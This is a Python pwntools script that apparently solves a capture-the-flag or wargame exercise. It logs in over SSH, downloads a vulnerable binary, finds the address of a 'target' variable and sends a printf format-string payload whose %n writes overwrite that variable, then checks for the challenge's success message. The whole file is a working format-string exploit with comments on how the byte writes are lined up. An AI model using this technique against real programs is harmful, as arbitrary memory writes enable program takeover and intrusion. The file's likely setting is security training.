from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
target_addr = e.symbols['target']
log.info('target_addr: %08x', target_addr)

idx = 12  # payload index for printf
nidx = lambda i: '%' + str(idx + i) + '$n'  # helper to focus on the addresses at the beginning of the payload
payload = flat([
    target_addr, target_addr + 1, target_addr + 2,  # first digit is far away (0x44), so we can fit the write addresses first
    cyclic(0x38), nidx(0),  # digit 0x44, offseted by the 3 target addresses in the payload
    cyclic(0x11), nidx(1),  # digit 0x55, adjusted from the 0x44 already printed char
    cyclic(0xad), nidx(2),  # d-digit 0x0102 adjusted to the 0x55 already printed. Note: splitting in 2 digits would bring too much problems
])

with s.system(args.BIN) as p:
    p.sendline(payload)
    p.recvline()
    ret = p.recvline()
    assert ret == 'you have modified the target :)\n'
